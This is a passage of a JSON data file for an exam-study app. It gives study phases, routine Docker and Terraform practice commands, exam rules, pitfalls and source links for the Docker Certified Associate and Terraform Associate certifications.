     "goal": "Have a real engine and a single-node swarm in front of you before you read a single blueprint line. Every DCA objective is a command you can run; reading about docker inspect output is how people fail DOMC items on docker inspect output.",
     "items": [
      {
       "label": "Confirm engine version, storage driver, cgroup driver and logging driver in one place",
       "hint": "docker info"
      },
      {
       "label": "Single-node swarm so orchestration objectives (25% of the exam) are runnable",
       "hint": "docker swarm init --advertise-addr <TARGET_IP>"
      },
      {
       "label": "Local registry so the registry objectives are runnable offline",
       "hint": "docker run -d -p 5000:5000 --restart=always --name registry registry:2"
      },
      {
       "label": "Pick today's domain by weight, not by comfort — orchestration + images is 45% of the paper",
       "hint": ""
      },
      {
       "label": "Open the corpus category that matches the domain (docker-engine 224 cmds, docker-security for domain 5)",
       "hint": ""
      }
     ]
    },
    {
     "id": "drill",
     "name": "Domain drill loop",
     "goal": "One domain per sitting, weighted. For each competency: run the command, read the real output, then state the answer from memory. DOMC punishes recognition-level knowledge, so the loop must end in recall, not in re-reading.",
     "items": [
      {
       "label": "Run the command for the competency and read the actual output",
       "hint": "docker inspect --format '{{range .Config.Env}}{{println .}}{{end}}' <IMAGE>:<TAG>"
      },
      {
       "label": "Layers and build history — a recurring image-domain item",
       "hint": "docker history --no-trunc <IMAGE>:<TAG>"
      },
      {
       "label": "Service vs container: create, scale, inspect the tasks, read why one will not schedule",
       "hint": "docker service ps --no-trunc <SERVICE>"
      },
      {
       "label": "Stack file round-trip — compose YAML to a deployed stack",
       "hint": "docker stack deploy -c docker-compose.yml <STACK>"
      },
      {
       "label": "Networking: publish mode host vs ingress on the same service",
       "hint": "docker service update --publish-rm <PORT> --publish-add mode=host,target=<PORT>,published=<PORT> <SERVICE>"
      },
      {
       "label": "Storage: prove where layers and volumes actually live and what reclaims them",
       "hint": "docker system df -v"
      },
      {
       "label": "Security: content trust on, then prove a push is signed",
       "hint": "DOCKER_CONTENT_TRUST=1 docker push <REGISTRY>/<IMAGE>:<TAG>"
      },
      {
       "label": "Close the competency by writing the one-line answer from memory, terminal hidden",
       "hint": ""
      }
     ]
    },
    {
     "id": "mock",
     "name": "Timed DOMC mock",
     "goal": "Rehearse the format, not just the content. 55 items in 90 minutes is roughly 98 seconds per item, and DOMC removes both the option overview and the chance to revise — so the skill being tested is committing to YES/NO on a single option with no context.",
     "items": [
      {
       "label": "Set a 90-minute timer, no notes, no second screen, no terminal — mirror the real closed-book rules",
       "hint": ""
      },
      {
       "label": "Answer each option on its own merits; do not infer what the other options would have been",
       "hint": ""
      },
      {
       "label": "Say NO decisively to options you know are wrong — a confident NO scores as well as a correct YES",
       "hint": ""
      },
      {
       "label": "Log every item where you hesitated, tagged to its domain, for the retro",
       "hint": ""
      }
     ]
    },
    {
     "id": "retro",
     "name": "Retrospective",
     "goal": "Turn the session into next week's weighted plan. There is no report to write and nobody to hand it to — the only artefact is your own domain scorecard.",
     "items": [
      {
       "label": "Score by domain and multiply by the blueprint weight — a 50% in Orchestration costs 12.5 points, a 50% in Storage costs 5",
       "hint": ""
      },
      {
       "label": "Separate 'did not know the fact' from 'knew it, misread the DOMC option'",
       "hint": ""
      },
      {
       "label": "List every UCP/DTR-era item you got wrong and decide whether to memorise it or accept the loss",
       "hint": ""
      },
      {
       "label": "Pick next session's domain by weighted deficit, not by what was fun",
       "hint": ""
      }
     ]
    }
   ],
   "timeSavers": [
    {
     "label": "Format-filter inspect instead of scrolling JSON",
     "cmd": "docker inspect --format '{{index .RepoDigests 0}}' <IMAGE>:<TAG>",
     "why": "The image and orchestration domains both contain items that hand you docker inspect output and ask what it means. Drilling with --format teaches you the field paths (.State.Status, .NetworkSettings.Networks, .Config.Env, .Mounts), which is what the items actually test. Seconds per lookup in the lab, and it is the difference between recognising a field name and guessing."
    },
    {
     "label": "One-line container state triage",
     "cmd": "docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.RestartCount}}' <CONTAINER>",
     "why": "Troubleshooting items ('a service is not deploying', 'a container keeps restarting') are answered from exactly these three fields. Learn the triple and you stop re-reading docker ps output during drills."
    },
    {
     "label": "Validate and render a compose file before deploying it",
     "cmd": "docker compose config",
     "why": "Renders the fully-merged, variable-substituted file. The stack-file objectives are about what the YAML resolves to, not what you typed — this shows you the resolved document in one command instead of debugging a failed stack deploy."
    },
    {
     "label": "See what disk is actually held by images, containers, volumes and cache",
     "cmd": "docker system df -v",
     "why": "Answers most of the Storage and Volumes domain (10%) in a single screen: layer residency, reclaimable space, which volumes are dangling. Far faster than reasoning about the graph driver in the abstract."
    },
    {
     "label": "Read why a service task will not schedule, untruncated",
     "cmd": "docker service ps --no-trunc <SERVICE>",
     "why": "The error column is truncated by default and the truncated text is useless. This is the single most productive command in the 25%-weighted Orchestration domain — placement constraint failures, image pull failures and resource-reservation failures all surface here."
    },
    {
     "label": "Prove an image is clean the way the Security domain describes it",
     "cmd": "trivy image --severity HIGH,CRITICAL --exit-code 1 <IMAGE>:<TAG>",
     "why": "'Demonstrate that an image passes a security scan' is a blueprint competency written in the Docker EE scanning era. A local scanner reproduces the concept — pass/fail gate on severity — without a UCP cluster. The corpus carries this exact form in docker-security."
    }
   ],
   "allowedDocs": [
    {
     "label": "DCA Study Guide v1.5 (January 2025, PDF)",
     "url": "https://a.storyblok.com/f/146871/x/2001ce939c/docker-study-guide_v1-5-jan-2025.pdf",
     "note": "The current blueprint. An older v1.1 (March 2020) PDF is still live on Docker's old CDN and still returns HTTP 200 — it will not fail loudly, it will just quietly hand you a five-year-old blueprint."
    },
    {
     "label": "Mirantis DCA certification page (format, validity, retake policy)",
     "url": "https://training.mirantis.com/certification/dca-certification-exam/",
     "note": "STUDY ONLY. Re-check this page before booking — it is the authoritative statement that the exam still exists."
    },
    {
     "label": "Docker Engine reference documentation",
     "url": "https://docs.docker.com/reference/",
     "note": "STUDY ONLY. Covers the engine/CLI half of the blueprint well; will NOT cover UCP, DTR or Docker EE objectives."
    },
    {
     "label": "Docker Swarm mode documentation",
     "url": "https://docs.docker.com/engine/swarm/",
     "note": "STUDY ONLY. Primary source for the 25%-weighted Orchestration domain."
    },
    {
     "label": "Mirantis Kubernetes Engine docs (the product formerly called UCP)",
     "url": "https://docs.mirantis.com/mke/",
     "note": "STUDY ONLY. The blueprint says UCP; the product is now MKE. Read it for the UCP/RBAC/client-bundle objectives that docs.docker.com no longer covers."
    }
   ],
   "rules": [
    {
     "kind": "banned",
     "text": "No notes and no books during the exam — it is fully closed book.",
     "enforceable": "Hide the cheat-sheet corpus and lock the session to mock mode when the exam timer is running, so the app cannot become the thing that gets you disqualified.",
     "source": "https://training.mirantis.com/certification/dca-certification-exam/",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Remotely proctored over Zoom on your own Windows or macOS machine; exam is delivered in English only, worldwide.",
     "enforceable": "Pre-flight checklist item: Zoom installed and working, webcam clear, room tidy, before the booked slot.",
     "source": "https://training.mirantis.com/certification/dca-certification-exam/",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "90 minutes for 55 items — about 98 seconds per item, with no ability to revisit a DOMC item once it resolves.",
     "enforceable": "Per-item pace indicator in mock mode; a nudge at 60 seconds on a single item.",
     "source": "https://docker.cdn.prismic.io/docker/3f8ef3b3-87f1-47c7-b820-0e0a8bb308d4_DCA_study_guide_+v1.1+pdf.pdf",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Recommended 6 to 12 months of hands-on Docker experience, including exposure to Docker Enterprise Edition, plus container security, one cloud provider, a configuration-management tool, and Linux and/or Windows Server.",
     "enforceable": "Show this as an entry gate on the preset card rather than letting someone start a 90-minute mock cold.",
     "source": "https://docker.cdn.prismic.io/docker/3f8ef3b3-87f1-47c7-b820-0e0a8bb308d4_DCA_study_guide_+v1.1+pdf.pdf",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Results are delivered immediately on completion; the credential is valid for 2 years.",
     "enforceable": "Store the sit date and surface a renewal reminder at 21 months.",
     "source": "https://training.mirantis.com/certification/dca-certification-exam/",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "A failed attempt means a 14-day wait and full fee again — there is no free retake in the Mirantis listing.",
     "enforceable": "Show the earliest legal retake date after a logged fail, so nobody books at day 7.",
     "source": "https://store.mirantis.com/product/docker-certified-associate-dca/",
     "confidence": "official"
    },
    {
     "kind": "required",
     "confidence": "official",
     "text": "Check-in requires Google Chrome plus a Chrome extension, and the Zoom desktop client. Firefox-only or a locked-down corporate laptop will fail check-in.",
     "enforceable": "",
     "source": "https://training.mirantis.com/certification/dca-certification-exam/"
    }
   ],
   "pitfalls": [
    {
     "text": "Buying a seat without checking that the exam still exists. This certification left Docker Inc. years ago and docs.docker.com/certification is a 404; it survives only as a Mirantis product, and multiple 2026 write-ups state flatly that it was discontinued. Verify on store.mirantis.com and training.mirantis.com on the day you pay.",
     "cost": "$199 and weeks of study aimed at a credential that may be withdrawn mid-preparation, or worse, a purchase page that takes money for an exam you cannot schedule.",
     "guard": "Show the status banner ('restructured — Docker Inc. no longer offers this; sold by Mirantis, last verified 2026-09-11') on the preset card and in the session header, with the two Mirantis links one click away."
    },
    {
     "text": "Studying modern Docker and skipping the Docker EE stack. Roughly a third of the blueprint's named objectives are UCP, DTR, client bundles, LDAP/AD integration, HA installs on AWS and UCP/DTR backups — products renamed to Mirantis Kubernetes Engine and Mirantis Secure Registry. Current docs.docker.com does not teach them at all.",
     "cost": "A ceiling you cannot see coming: strong practical Docker skills that still land below the pass line because the Installation, Security and Orchestration domains lean on Enterprise-era material.",
     "guard": "Tag every competency in the domain list as engine-era or EE-era, and track drill coverage separately so the EE-era gap is visible rather than quietly skipped."
    },
    {
     "text": "Treating DOMC like multiple choice. Options arrive one at a time, you answer YES or NO to each, the item closes as soon as it resolves — correctly or incorrectly — and you never see the full option set or get to revise. Candidates trained on four-option questions wait for the 'obviously best' option that never arrives, then say YES to a merely plausible one.",
     "cost": "Items lost on knowledge you actually had. It is the most-cited reason people fail this specific exam.",
     "guard": "Make mock mode DOMC-native: present one option at a time, force a YES/NO, close the item on resolution, and never show the unasked options afterwards."
    },
    {
     "text": "Drilling from reading rather than from a running engine. The blueprint is written in 'describe AND demonstrate' language and the items lean on real command output — inspect fields, service ps error strings, history layers, system df numbers.",
     "cost": "Recognition-level knowledge that collapses under DOMC, which gives you no options to recognise.",
     "guard": "Require a lab-up phase before the drill loop unlocks, and attach a runnable corpus command to every competency."
    },
    {
     "text": "Ignoring the weights and over-studying what you enjoy. Orchestration plus Image Creation is 45% of the paper; Storage and Volumes is 10%. An hour spent perfecting devicemapper is worth a fraction of an hour on swarm quorum and stack files.",
     "cost": "Even effort across six domains produces an uneven score against a weighted blueprint.",
     "guard": "Weight the live score estimate by domain percentage and show weighted deficit — 'Orchestration 60% × 25 = 15.0 of 25' — instead of a flat per-domain percentage."
    },
    {
     "text": "Pacing by the clock instead of by the item. 98 seconds per item average, but DOMC items resolve in a few seconds when you know them; the danger is the single item that eats four minutes because you are trying to reconstruct the whole question from one option.",
     "cost": "A rushed final ten items — usually in whichever domain sits last in the shuffle.",
     "guard": "Per-item timer in mock mode with a 60-second nudge: commit to YES/NO and move."
    },
    {
     "text": "Planning around a free retake that the vendor does not offer. Third-party sites quote $195 with a free retake within a year; the Mirantis pages state $199/€200, full fee per attempt, 14-day wait.",
     "cost": "An unbudgeted second $199 and a two-week gap you did not plan for.",
     "guard": "Show the official retake terms, with source link, next to the exam price in the preset card."
    }
   ],
   "retroSections": [
    "Weighted domain scorecard (per-domain % × blueprint weight)",
    "Knowledge gaps vs format errors (didn't know it / knew it and misread the DOMC option)",
    "Engine-era vs Enterprise-era (UCP/DTR/MKE/MSR) coverage",
    "Items that took over 60 seconds, and why",
    "Commands drilled in the lab this session vs commands only read about",
    "Next session's domain, chosen by weighted deficit",
    "Booking decision: is the exam still listed, and is it still worth the $199"
   ],
   "sources": [
    "https://a.storyblok.com/f/146871/x/2001ce939c/docker-study-guide_v1-5-jan-2025.pdf",
    "https://training.mirantis.com/certification/dca-certification-exam/",
    "https://store.mirantis.com/product/docker-certified-associate-dca/"
   ],
   "unverified": [
    "Passing score. Mirantis states explicitly that questions and passing scores are subject to change without notice and does not publish a figure; third-party sites claim 65%, which has no official source. passMark is set to 0 to mean 'not published' — the app must render it as 'not published by the vendor', never as a target.",
    "How long Mirantis will continue to offer the exam. Status here is 'listed for sale as of 2026-09-11'; several 2026 sources report it as discontinued and it should be re-checked before any purchase.",
    "The widely-quoted '$195 including one free retake' price. Contradicted by both Mirantis pages; treated as wrong rather than merely unverified.",
    "Exact ID/identity-verification requirements at check-in — not published on the pages checked.",
    "Whether the exam's Kubernetes coverage has been refreshed for current Kubernetes versions; the blueprint's Kubernetes objectives date from the Docker EE 3.x era.",
    "Per-domain percentages come from the study guide's blueprint table and are identical between v1.1 and v1.5."
   ],
   "passMarkUndisclosed": true,
   "passMarkNote": "Mirantis does not publish a passing score, stating that questions and passing scores may change without notice. Figures circulating on blogs are not official.",
   "notes": [],
   "appFeatures": []
  },
  {
   "id": "terraform-associate",
   "name": "HashiCorp Certified: Terraform Associate (004)",
   "icon": "🏗️",
   "tagline": "For the practitioner who writes Terraform daily and now has to answer questions about it — 57-ish multiple choice in 60 minutes, closed book, no terminal to save you.",
   "kind": "tasks",
   "focus": "iac",
   "status": "active",
   "statusNote": "",
   "durationMin": 60,
   "taskCount": 0,
   "format": "Not hands-on. Multiple choice — including multiple-select and true/false items — in a 1-hour online-proctored session, English, closed book, with a live proctor who verifies identity and monitors the session. No terminal, no cloud account, no tasks, so there is no per-task clock and no context to switch. This preset models a domain-weighted STUDY session: drill the published objective list against a real working directory, then sit a timed mock. Question count is commonly reported as ~57 but HashiCorp does not publish it (see unverified).",
   "passMark": 0,
   "curriculumVersion": "Terraform Associate 004 (exam code HCTA0-004) — current version per HashiCorp, tested against Terraform 1.12. It replaced 003, adding depends_on lifecycle rules, custom condition validation, ephemeral values and HCP Terraform workspace/project organisation. Objectives below are the published 004 exam content list, verbatim.",
   "retakeNote": "$70.50 USD plus applicable taxes per attempt; a free retake is NOT included, so a fail means paying again. The certification is valid for 2 years. Prerequisites are informal: basic terminal skills and an understanding of on-premises and cloud architecture.",
   "domains": [
    {
     "id": "1-iac",
     "name": "Infrastructure as Code (IaC) with Terraform",
     "weight": 8,
     "competencies": [
      "1a Explain what IaC is",
      "1b Describe the advantages of IaC patterns",
      "1c Explain how Terraform manages multi-cloud, hybrid cloud, and service-agnostic workflows"
     ],
     "derived": true
    },
    {
     "id": "2-fundamentals",
     "name": "Terraform fundamentals",
     "weight": 11,
     "competencies": [
      "2a Install and version Terraform providers",
      "2b Describe how Terraform uses providers",
      "2c Write Terraform configuration using multiple providers",
      "2d Explain how Terraform uses and manages state"
     ],
     "derived": true
    },
    {
     "id": "3-workflow",
     "name": "Core Terraform workflow",
     "weight": 19,
     "competencies": [
      "3a Describe the Terraform workflow",
      "3b Initialize a Terraform working directory",
      "3c Validate a Terraform configuration",
      "3d Generate and review an execution plan",
      "3e Apply changes to infrastructure",
      "3f Destroy Terraform-managed infrastructure",
      "3g Apply formatting and style adjustments to a configuration"
     ],
     "derived": true
    },
    {
     "id": "4-configuration",
     "name": "Terraform configuration",
     "weight": 22,
     "competencies": [
      "4a Use and differentiate resource and data blocks",
      "4b Refer to resource attributes and create cross-resource references",
      "4c Use variables and outputs",
      "4d Understand and use complex types",
      "4e Write dynamic configuration using expressions and functions",
      "4f Define resource dependencies in configuration",
      "4g Validate configuration using custom conditions",
      "4h Understand best practices for managing sensitive data, including secrets management with Vault"
     ],
     "derived": true
    },
    {
     "id": "5-modules",
     "name": "Terraform modules",
     "weight": 11,
     "competencies": [
      "5a Explain how Terraform sources modules",
      "5b Describe variable scope within modules",
      "5c Use modules in configuration",
      "5d Manage module versions"
     ],
     "derived": true
    },
    {
     "id": "6-state",
     "name": "Terraform state management",
     "weight": 11,
     "competencies": [
      "6a Describe the local backend",
      "6b Describe state locking",
      "6c Configure remote state using the backend block",
      "6d Manage resource drift and Terraform state"
     ],
     "derived": true
    },
    {
     "id": "7-maintain",
     "name": "Maintain infrastructure with Terraform",
     "weight": 8,
     "competencies": [
      "7a Import existing infrastructure into your Terraform workspace",
      "7b Use the CLI to inspect state",
      "7c Describe when and how to use verbose logging"
     ],
     "derived": true
    },
    {
     "id": "8-hcp",
     "name": "HCP Terraform",
     "weight": 10,
     "competencies": [
      "8a Use HCP Terraform to create infrastructure",
      "8b Describe HCP Terraform collaboration and governance features",
      "8c Describe how to organize and use HCP Terraform workspaces and projects",
      "8d Configure and use HCP Terraform integration"
     ],
     "derived": true
    }
   ],
   "phases": [
    {
     "id": "workdir-up",
     "name": "Working directory up (3 minutes, once per session)",
     "goal": "A real initialized directory with a null/local provider, so every objective can be executed rather than recited. The exam has no terminal, which is exactly why preparation must have one.",
     "items": [
      {
       "label": "Confirm the CLI version matches what 004 tests (Terraform 1.12)",
       "hint": "terraform version"
      },
      {
       "label": "Initialize a throwaway directory — providers, lock file, .terraform layout",
       "hint": "terraform init"
      },
      {
       "label": "Read the lock file and provider selections you just created",
       "hint": "terraform providers"
      },
      {
       "label": "Pick today's objective group by weighted deficit — 3 and 4 together are the largest share of the drill plan",
       "hint": ""
      },
      {
       "label": "Open the corpus terraform category (190 commands) filtered to that objective group",
       "hint": ""
      }
     ]
    },
    {
     "id": "drill",
     "name": "Objective drill loop",
     "goal": "One objective group per sitting. For each sub-objective: run it, break it on purpose, read the error, then state the rule from memory. The exam asks about behaviour and precedence, which you learn from failures, not from happy paths.",
     "items": [
      {
       "label": "3c/3g — validate and format, including the CI-shaped check form",
       "hint": "terraform fmt -recursive -check -diff && terraform validate"
      },
      {
       "label": "3d — generate a plan file and read it back as machine-readable JSON",
       "hint": "terraform plan -out=<FILE> && terraform show -json <FILE>"
      },
      {
       "label": "3d — the exit-code contract that CI relies on (0 no changes, 1 error, 2 changes)",
       "hint": "terraform plan -detailed-exitcode"
      },
      {
       "label": "4c/7b — outputs, including sensitive and raw handling",
       "hint": "terraform output -json | jq '.<NAME>.value'"
      },
      {
       "label": "4f — dependencies: prove implicit vs explicit by rendering the graph",
       "hint": "terraform graph | dot -Tsvg > graph.svg"
      },
      {
       "label": "6d — drift: refresh-only plan, then targeted replacement",
       "hint": "terraform plan -refresh-only"
      },
      {
       "label": "6d — replace the resource rather than the deprecated taint workflow",
       "hint": "terraform apply -replace='aws_instance.<NAME>'"
      },
      {
       "label": "7a — import, and the 004-relevant config generation path",
       "hint": "terraform plan -generate-config-out=<FILE>.tf"
      },
      {
       "label": "6b/6c — remote backend and what happens when a lock is held",
       "hint": "terraform init -backend-config=<FILE>.hcl"
      },
      {
       "label": "7c — verbose logging levels and where they write",
       "hint": "TF_LOG=DEBUG TF_LOG_PATH=./tf.log terraform plan"
      },
      {
       "label": "8a/8d — sign in to HCP Terraform and run a remote plan",
       "hint": "terraform login app.terraform.io"
      },
      {
       "label": "Close each sub-objective by stating the rule out loud with the terminal hidden",
       "hint": ""
      }
     ]
    },
    {
     "id": "mock",
     "name": "Timed mock, closed book",
     "goal": "60 minutes, no terminal, no docs. About 63 seconds per question if the count really is 57 — the failure mode is not knowledge, it is spending three minutes mentally running terraform plan on a question you could have answered from the rule.",
     "items": [
      {
       "label": "Close the corpus, the Terraform docs and the registry — mirror the closed-book rule",
       "hint": ""
      },
      {
       "label": "Read multi-select stems for the number required ('choose two') before reading options",
       "hint": ""
      },
      {
       "label": "Flag and move at 90 seconds rather than reconstructing behaviour from first principles",
       "hint": ""
      },
      {
       "label": "Answer from the documented rule, not from what your provider version happened to do last week",
       "hint": ""
      },
      {
       "label": "Tag every flagged question to its objective number for the retro",
       "hint": ""
      }
     ]
    },
    {
     "id": "retro",
     "name": "Retrospective",
     "goal": "There is no report and no client. The artefact is an objective-level scorecard that tells you which of the eight groups to drill next.",
     "items": [
      {
       "label": "Score per objective group (1-8) and list the exact sub-objective codes missed, e.g. 4d, 6b",
       "hint": ""
      },
      {
       "label": "Separate 'never used this feature' from 'use it daily and still got it wrong'",
       "hint": ""
      },
      {
       "label": "Check for 003-era answers: Terraform Cloud naming, deprecated taint, pre-1.x behaviour",
       "hint": ""
      },
      {
       "label": "Note every question answered from habit rather than from the documented rule",
       "hint": ""
      },
      {
       "label": "Decide next session's objective group by weighted deficit",
       "hint": ""
      }
     ]
    }
   ],
   "timeSavers": [
    {
     "label": "Format check and validate as one gate",
     "cmd": "terraform fmt -recursive -check -diff && terraform validate",
     "why": "Objectives 3c and 3g in one keystroke, and the -check -diff form is what the exam's CI-shaped questions describe: non-zero exit plus the diff, without rewriting files. Drilling the plain `terraform fmt` form teaches you the wrong flag behaviour for those items."
    },
    {
     "label": "Plan to a file, then read the plan as JSON",
     "cmd": "terraform plan -out=<FILE> && terraform show -json <FILE>",
     "why": "The single highest-yield drill for objective 3d. Saved-plan semantics (apply consumes it, the plan is not re-evaluated, variables are baked in) are directly examinable, and the JSON view shows you the resource-change actions the questions are written about."
    },
    {
     "label": "The detailed exit code",
     "cmd": "terraform plan -detailed-exitcode",
     "why": "0 = no changes, 1 = error, 2 = changes present. A small fact that appears in automation-flavoured questions and takes fifteen seconds to verify once in a real directory versus a coin-flip in the exam."
    },
    {
     "label": "Refresh-only plan for drift questions",
     "cmd": "terraform plan -refresh-only",
     "why": "Objective 6d is drift, and the modern answer is refresh-only, not `terraform refresh` (deprecated). Running it once against a hand-edited state fixes the distinction permanently."
    },
    {
     "label": "Replace instead of taint",
     "cmd": "terraform apply -replace='aws_instance.<NAME>'",
     "why": "Study material written for 003 and earlier still teaches `terraform taint`. The -replace flag is the current answer; knowing both, and which one is deprecated, converts a whole family of questions into free points."
    },
    {
     "label": "Inspect state without opening the state file",
     "cmd": "terraform state list && terraform state show '<RESOURCE_ADDR>'",
     "why": "Objective 7b is literally 'use the CLI to inspect state'. These two commands, plus knowing that state mv/rm change state and not infrastructure, cover most of it — and stop you reaching for the file, which the exam treats as the wrong answer."
    },
    {
     "label": "Verbose logging with a log path",
     "cmd": "TF_LOG=DEBUG TF_LOG_PATH=./tf.log terraform plan",
     "why": "Objective 7c. The examinable details are the level names (TRACE/DEBUG/INFO/WARN/ERROR), that TRACE is the most verbose, and that TF_LOG_PATH is what persists it. Ten seconds to confirm, and it appears in questions."
    },
    {
     "label": "Import with generated configuration",
     "cmd": "terraform plan -generate-config-out=<FILE>.tf",
     "why": "Objective 7a. The import block plus config generation is the current workflow; the older `terraform import` CLI command still exists and the exam expects you to know both and when each applies."
    }
   ],
   "allowedDocs": [
    {
     "label": "Exam Content List — Terraform Associate 004 (official objectives)",
     "url": "https://developer.hashicorp.com/terraform/tutorials/certification-004/associate-review-004",
     "note": "STUDY ONLY. HashiCorp exams are proctored and closed book: you must be alone in a quiet room with only the exam machine — no phones, no second monitor, no notes. Every link here is banned once the session starts."
    },
    {
     "label": "Associate Prep (004) — official learning path and sample questions",
     "url": "https://developer.hashicorp.com/terraform/tutorials/certification-004",
     "note": "STUDY ONLY. Includes the official sample questions, which are the best available calibration for question style."
    },
    {
     "label": "Infrastructure Automation certification page (duration, price, validity)",
     "url": "https://developer.hashicorp.com/certifications/infrastructure-automation",
     "note": "STUDY ONLY. The authoritative page for exam logistics; re-check it before booking, since this exam has already moved 003 → 004."
    },
    {
     "label": "Terraform CLI documentation",
     "url": "https://developer.hashicorp.com/terraform/cli",
     "note": "STUDY ONLY. Flag-level detail for objectives 3, 6 and 7."
    },
    {
     "label": "Terraform language documentation (blocks, expressions, functions, conditions)",
     "url": "https://developer.hashicorp.com/terraform/language",
     "note": "STUDY ONLY. Covers objective group 4, the largest single block of sub-objectives, including custom conditions and ephemeral values new in 004."
    },
    {
     "label": "HCP Terraform documentation",
     "url": "https://developer.hashicorp.com/terraform/cloud-docs",
     "note": "STUDY ONLY. Objective group 8 is HCP Terraform by name — workspaces, projects, run tasks, governance."
    },
    {
     "label": "Terraform Registry (module and provider sourcing, versioning)",
     "url": "https://registry.terraform.io/",
     "note": "STUDY ONLY. Needed for objective group 5: source addresses, version constraints, published module structure."
    }
   ],
   "rules": [
    {
     "kind": "banned",
     "text": "Closed book: no notes, no documentation, no second device and no second monitor. You must be alone in a quiet room with only the machine you are testing on.",
     "enforceable": "Lock the app to mock mode while the exam timer runs — corpus search, docs bookmarks and the fill-bar hidden — so the workbench cannot become the reason a proctor voids your session.",
     "source": "https://hashicorp-certifications.zendesk.com/hc/en-us/articles/26234761626125-Exam-appointment-rules-and-requirements",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Online proctored with a live proctor who verifies your identity, explains the rules and monitors the whole session. The complete rule list is issued at registration and breaking it can forfeit the fee.",
     "enforceable": "Pre-flight checklist: ID ready, room cleared, webcam and mic tested, rules email re-read the night before.",
     "source": "https://developer.hashicorp.com/certifications",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "One hour total, no extensions.",
     "enforceable": "Mock-mode countdown with a per-question pace target and a flag-and-move nudge, since there is no per-task budget to compute here.",
     "source": "https://developer.hashicorp.com/certifications/infrastructure-automation",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Answer against Terraform 1.12 and HCP Terraform (Community Edition workflows plus HCP), not against whatever version and enterprise features your employer runs.",
     "enforceable": "Stamp the tested version on the mock header and flag corpus commands whose behaviour differs from 1.12.",
     "source": "https://developer.hashicorp.com/certifications/infrastructure-automation",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Informal prerequisites only — basic terminal skills and an understanding of on-premises and cloud architecture. No prior certification required.",
     "enforceable": "Show on the preset card so nobody hunts for a missing prerequisite exam.",
     "source": "https://developer.hashicorp.com/certifications/infrastructure-automation",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "$70.50 USD plus tax per attempt, free retake not included; credential valid 2 years.",
     "enforceable": "Record the sit date and surface a renewal reminder at 21 months.",
     "source": "https://developer.hashicorp.com/certifications/infrastructure-automation",
     "confidence": "official"
    },
    {
     "kind": "required",
     "confidence": "official",
     "text": "Delivered through Certiverse, HashiCorp's online exam and proctoring system.",
     "enforceable": "",
     "source": "https://hashicorp-certifications.zendesk.com/hc/en-us/articles/26234761626125-Exam-appointment-rules-and-requirements"
    }
   ],
   "pitfalls": [
    {
     "text": "Preparing from 003 material. The exam was revised to 004 and the courses, practice tests and blog guides that dominate search results were written for 003. The 004 additions — depends_on lifecycle rules, custom condition validation, ephemeral values, HCP Terraform workspaces and projects — are precisely the questions a 003-trained candidate has never seen.",
     "cost": "A block of questions on material that was simply never studied, on an exam with no free retake.",
     "guard": "Stamp '004 / Terraform 1.12' on the session header and mark objectives new in 004 with a badge, so the drill plan cannot silently inherit a 003 syllabus."
    },
    {
     "text": "Answering from production habits instead of documented behaviour. Daily Terraform users lose points on questions about features their team has standardised away: workspaces (because they use directories), taint vs -replace (because CI recreates everything), local backend semantics (because everything is remote), provisioners (because they are discouraged).",
     "cost": "The counter-intuitive result: experienced practitioners underperform on exactly the objectives they touch least, while juniors who read the docs score them.",
     "guard": "Track drill coverage per sub-objective code and highlight sub-objectives never drilled, rather than assuming experience covers them."
    },
    {
     "text": "Terraform Cloud vs HCP Terraform naming. Objective group 8 is named HCP Terraform and the docs use that name throughout; older material, and muscle memory, say Terraform Cloud. Option text can hinge on the current name and on current concepts like projects.",
     "cost": "Questions lost to vocabulary rather than understanding.",
     "guard": "Normalise the naming in all objective-8 drill content and flag any corpus or note text that still says 'Terraform Cloud'."
    },
    {
     "text": "Missing the 'select all that apply' count. Multiple-select items state how many to choose, and there is no partial credit; skim-readers answer a two-select question with one option.",
     "cost": "Whole items lost on questions the candidate knew completely.",
     "guard": "In mock mode, surface the required selection count as a persistent chip and refuse submission until the count matches."
    },
    {
     "text": "Mentally running the plan. Faced with a configuration snippet, practitioners simulate terraform plan line by line instead of recalling the rule the question is testing. At roughly 63 seconds a question, two such simulations eat a fifth of the exam.",
     "cost": "Time starvation at the end of the paper, where the last questions are answered at a guess.",
     "guard": "Per-question pace indicator and a 90-second nudge: flag it, move on, return in the sweep."
    },
    {
     "text": "Assuming a 70% pass mark. HashiCorp does not publish a passing score anywhere official; the 70% figure circulating in study blogs has no vendor source, so 'I scored 72% on a practice test' means nothing concrete.",
     "cost": "Booking too early on a false sense of margin — with no free retake, that mistake costs the full fee again.",
     "guard": "Render passMark as 'not published by HashiCorp' rather than a number, and express readiness as sub-objective coverage instead of a percentage against an imaginary line."
    },
    {
     "text": "Ignoring the objective groups' relative size. HashiCorp publishes no weights, so candidates study the eight groups evenly; groups 3 and 4 together carry roughly forty per cent of the published sub-objectives, and group 1 carries three.",
     "cost": "Hours spent on 'explain what IaC is' that belonged in configuration and workflow.",
     "guard": "Show the weights as clearly derived-not-official (see unverified) while still using them to order the drill queue."
    }
   ],
   "retroSections": [
    "Score per objective group (1-8), with the exact sub-objective codes missed",
    "Experience gap vs documentation gap (never used it / use it daily and still got it wrong)",
    "003-era answers given: Terraform Cloud naming, taint, terraform refresh, pre-1.x behaviour",
    "Questions where you simulated a plan instead of recalling a rule, and what they cost in time",
    "Multi-select items lost on the selection count rather than the content",
    "Sub-objectives never drilled in a real working directory",
    "Next session's objective group, and whether the drill plan still matches the 004 content list"
   ],
   "sources": [
    "https://developer.hashicorp.com/certifications/infrastructure-automation",
    "https://developer.hashicorp.com/terraform/tutorials/certification-004/associate-review-004",
    "https://developer.hashicorp.com/terraform/tutorials/certification-004",
    "https://developer.hashicorp.com/terraform/tutorials/certification-004/associate-questions-004",
    "https://developer.hashicorp.com/certifications",
    "https://developer.hashicorp.com/terraform/cli",
    "https://developer.hashicorp.com/terraform/cloud-docs"
   ],
   "unverified": [
